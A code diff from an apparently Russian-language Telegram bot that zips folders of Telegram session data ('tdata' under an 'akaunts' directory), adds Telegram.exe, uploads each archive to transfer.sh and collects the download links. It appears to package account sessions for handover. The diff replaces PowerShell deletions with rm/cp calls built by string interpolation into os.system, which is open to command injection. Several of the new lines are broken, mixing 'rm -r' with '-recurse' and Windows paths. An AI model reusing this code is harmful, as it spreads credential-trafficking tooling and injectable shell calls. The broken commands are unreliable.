@@ -75,16 +75,16 @@ async def start(message: types.Message,  state: FSMContext):
             await message.answer(f"<b>В работе {xx[0]} ожидайте....</b>")
             data_x = f"data/{xx[0]}"
             datax = os.listdir(data_x)
-            os.system(f"powershell Remove-item data\{xx[0]}\{datax[0]} -recurse")
-            os.system(f"powershell Remove-item data\{xx[0]}\{datax[1]} -recurse")
-            os.system(f"powershell Remove-item data\{xx[0]}\{datax[3]} -recurse")
-            os.system(f"powershell Remove-item data\{xx[0]}\\'{datax[4]}' -recurse")
-            os.system(f"powershell copy  system/settingss data\{xx[0]}\\tdata\settingss")
-            os.system(f"powershell copy  system/Telegram.exe data\{xx[0]}\\Telegram.exe")
+            os.system(f"rm -r  data\{xx[0]}\{datax[0]} ")
+            os.system(f"rm -r  data\{xx[0]}\{datax[1]} ")
+            os.system(f"rm -r  data\{xx[0]}\{datax[3]} ")
+            os.system(f"rm -r  data\{xx[0]}\\'{datax[4]}' ")
+            os.system(f"cp -r  system/settingss data\{xx[0]}\\tdata\settingss")
+            os.system(f"cp -r  system/Telegram.exe data\{xx[0]}\\Telegram.exe")
             output_filename = f'akaunts_zip\{xx[0]}/'
             rar = f'akaunts_zip\{xx[0]}.zip'
             shutil.make_archive(output_filename, 'zip', data_x) 
-            os.system(f"powershell Remove-item data\{xx[0]} -recurse")
+            os.system(f"rm -r  data\{xx[0]} -recurse")
             URL_TRANSFERSH = 'https://transfer.sh'
             with open(rar, 'rb') as data:
                 conf_file = {rar: data}
@@ -95,7 +95,7 @@ async def start(message: types.Message,  state: FSMContext):
                # await message.answer(download_url)
                 time.sleep(5)
                 data.close()
-                os.system(f"powershell Remove-item {rar} -recurse")
+                os.system(f"rm -r  {rar} -recurse")
                 baza.append(download_url)
                 #loop = asyncio.get_event_loop()
                 #loop.create_task(sending_check(2))
